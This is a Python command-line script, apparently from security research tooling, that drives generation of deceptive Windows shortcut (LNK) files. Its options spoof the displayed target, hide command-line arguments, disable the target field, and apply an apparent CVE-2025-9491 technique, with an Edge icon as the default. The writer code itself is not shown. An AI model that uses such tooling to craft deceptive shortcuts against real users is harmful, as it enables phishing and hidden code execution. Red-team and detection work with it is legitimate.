import argparse
import enum
import logging
import os
import sys

from .lnk_writers import LnkDetails, LnkWriterDisableWithoutArguments, LnkWriterFakeExeDisabled, LnkWriterFakeTargetExe, LnkWriterOverflow, LnkWriterCVE20259491


# Configure logging
class CustomFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord):
        record.msg = {logging.CRITICAL: "[-] ",logging.ERROR: "[-] ", logging.INFO: "[+] ", logging.WARNING: "[!] "}.get(record.levelno, "") + str(record.msg)
        return super().format(record)


logging.basicConfig(format="%(message)s", level=logging.DEBUG)
logging.getLogger().handlers[0].setFormatter(CustomFormatter())


# Define supported types
class LnkType(enum.Enum):
    SPOOFEXE_SHOWARGS_ENABLETARGET = (LnkWriterFakeTargetExe, "Spoof the target executable (command-line arguments will remain visible, target field will be enabled)")
    REALEXE_HIDEARGS_DISABLETARGET = (LnkWriterDisableWithoutArguments, "Disable the entire target field, only show target executable (command-line arguments are invisible)")
    SPOOFEXE_OVERFLOWARGS_DISABLETARGET = (LnkWriterOverflow, "Spoof the target executable (command-line arguments will be visually hidden, target field will be disabled) - no longer works on Windows 11 24H2 and higher")
    SPOOFEXE_HIDEARGS_DISABLETARGET = (LnkWriterFakeExeDisabled, "Spoof the target executable (command-line arguments will be fully hidden, target field will be disabled)")
    CVE20259491 = (LnkWriterCVE20259491, "Only show target executable (command-line arguments are invisible)")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Generate a deceptive LNK file. (C) @Wietze, 2025-2026", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("lnk_type", choices=[e.name for e in LnkType], help='\n'.join(f'{e.name:<40}{e.value[-1]}' for e in LnkType))

    parser_target = parser.add_argument_group("LNK target")
    parser_target.add_argument("--target-executable", required=True, type=str, help="The path of the executable that should be executed.", metavar="c:\\path\\to\\file.exe")
    parser_target.add_argument("--target-command-line", required=False, type=str, help="Any command-line arguments for the target executable.", metavar="\"/some /arguments\"")
    parser_target.add_argument("--fake-path", required=False, type=str, help="A spoofed path that will be displayed in the LNK's target field.", metavar="c:\\path\\to\\fake_file.exe")

    parser_icon = parser.add_argument_group("LNK icon")
    parser_icon.add_argument("--icon", required=False, type=str, default="%PROGRAMFILES(x86)%\\Microsoft\\Edge\\Application\\msedge.exe", help="A path to a .ico file that will be used as the LNK file's icon. Supports environment variables.", metavar="c:\\path\\to\\icon.ico")
    parser_icon.add_argument("--icon-index", required=False, type=int, default=11, help="The index within the specified icon file that holds the icon the LNK file should display.", metavar="n")

    parser.add_argument("--output", required=False, type=str, default=os.path.join(".", "shortcut.lnk"), help="The output path of the LNK on this system.", metavar=os.path.join("path", "to", "shortcut.lnk"))

    opts = parser.parse_args()

    # Check output path
    output_path = os.path.abspath(opts.output)
    if not (os.access(output_path if os.path.exists(output_path) else os.path.dirname(os.path.abspath(output_path)) or '.', os.W_OK)):
        logging.error("Could not write to %s" % output_path)
        sys.exit(-1)

    # Icon logic
    if opts.icon != parser.get_default("icon") and opts.icon_index == parser.get_default("icon_index"):
        opts.icon_index = 0

    # Create LnkDetails object
    lnk_details = LnkDetails(target_path=opts.target_executable, target_cmd=opts.target_command_line, fake_path=opts.fake_path, icon_path=opts.icon, icon_index=opts.icon_index, output_path=output_path)

    # Look up and execute LnkWriter subclass
    lnk_type = LnkType[opts.lnk_type]

    if lnk_type in [LnkType.REALEXE_HIDEARGS_DISABLETARGET, LnkType.CVE20259491]:
        if lnk_details.fake_path:
            logging.warning("argument --fake-path will be ignored for this LNK type")
    else:
        if not lnk_details.fake_path:
            logging.error("argument --fake-path required for this LNK type")
            sys.exit(-1)

    if '%' in lnk_details.target_path and not lnk_type in [LnkType.SPOOFEXE_HIDEARGS_DISABLETARGET, LnkType.CVE20259491]:
        logging.error("argument --target-path cannot contain environment variables for this LNK type")
        sys.exit(-1)

    if not opts.target_command_line and lnk_type in [LnkType.CVE20259491]:
        logging.error("command-line arguments required for this output type")
        sys.exit(-1)

    lnk_type.value[0].write(lnk_details)
